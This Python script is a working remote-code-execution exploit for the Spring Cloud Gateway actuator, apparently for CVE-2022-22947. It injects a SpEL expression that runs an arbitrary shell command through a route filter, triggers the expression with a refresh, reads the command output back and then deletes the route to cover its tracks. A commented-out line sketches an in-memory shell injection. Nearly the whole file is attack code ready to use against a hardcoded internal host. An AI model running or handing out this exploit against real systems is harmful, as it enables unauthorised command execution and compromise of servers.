import requests
import json
import base64
import string
import random
import sys

baseurl = "http://192.168.15.32:8080/actuator/gateway/"

headers = {
  'Content-Type': 'application/json'
}

def generate_route_id():
  print("[+] Generating route id...")
  random_id = "".join(random.choice(string.ascii_lowercase) for i in range(5)) 
  route_id = "route_%s" % random_id
  print("[=] Here you have your route id: %s" % route_id)
  return route_id

def create_route(route_id, cmd):
  print("[+] Creating a route so you can play")

  command_bytes = cmd.encode('ascii')
  base64_bytes = base64.b64encode(command_bytes)
  base64_command = base64_bytes.decode('ascii')

  command = "{ new String( T(org.springframework.util.StreamUtils).copyToByteArray( T(java.lang.Runtime).getRuntime().exec( new String(T(org.springframework.util.Base64Utils).decodeFromString(\"%s\")) ).getInputStream() ) ) }" %  base64_command
  #command2 = "{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}" % base64_command

  # https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg
  # https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/
  # https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/

  payload = json.dumps({
    "id": "%s" % route_id,
    "filters": [
      {
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#%s" % command
        }
      }
    ],
    "uri": "https://www.mostwantedduck.tk"
  })

  url = "%sroutes/%s" % (baseurl, route_id)
  response = requests.post(url, headers=headers, data=payload)
  return response

def refresh():
  print("[+] Refreshing...")
  url = baseurl + "refresh/"
  response = requests.post(url, headers=headers)
  return response

def execute_command(route_id):
  print("[+] Executing command, fingers crossed...")
  url = "%sroutes/%s" % (baseurl, route_id)
  response = requests.get(url, headers=headers)
  return response

def delete_route(route_id):
  print("[-] Deleting individual route %s" %route_id)
  url = "%sroutes/%s" % (baseurl, route_id)
  response = requests.delete(url, headers=headers)
  refresh()
  return response

def force_delete_route():
  url = "%sroutes/" % baseurl
  response = requests.get(url, headers=headers)
  body = response.json()

  for item in body:
    curr_route_id = item["route_id"]

    if (curr_route_id == "index"):
      continue

    delete_route(curr_route_id)

def main():
  print("")

  command = sys.argv[1]
  route_id = generate_route_id()

  response = create_route(route_id, command)

  if (response.status_code != 201):
    print("")
    print("[!] That's a bad start... Try again...")
    print("[!] Last command that was issued => %s" % command)
    print("[!} Forcing cleanup...")
    force_delete_route()
    print("")
    sys.exit(-1)

  response = refresh()

  if (response.status_code != 200):
    print("")
    print("[!] Gzzz... That's weird... Error while refreshing, check your command")
    print("[!] Last command that was issued => %s" % command)
    print("[!} Forcing cleanup...")
    force_delete_route()
    print("")
    sys.exit(-1)

  response = execute_command(route_id)

  if (response.status_code != 200):
    print("") 
    print("[!] Uff... We broke something and might need to restart your Spring Cloud Gateway")
    print("[!] Last command that was issued => %s" % command)
    print("[!} Forcing cleanup...")
    force_delete_route()
    print("")
    sys.exit(-1)

  body = response.json()

  response_header_result = body["filters"][0].split("'")[1]

  print("")
  print("-" * 80)
  print(response_header_result)
  print("-" * 80)
  print("")

  response = delete_route(route_id)

  if (response.status_code != 200):
    print("") 
    print("[!] Route was not deleted, some bits might be out of place, better take a look!")
    print("[!] Last command that was issued => %s" % command)
    print("[!} Forcing cleanup...")
    force_delete_route()
    print("")
    sys.exit(-1)

if __name__ == "__main__":
  main()


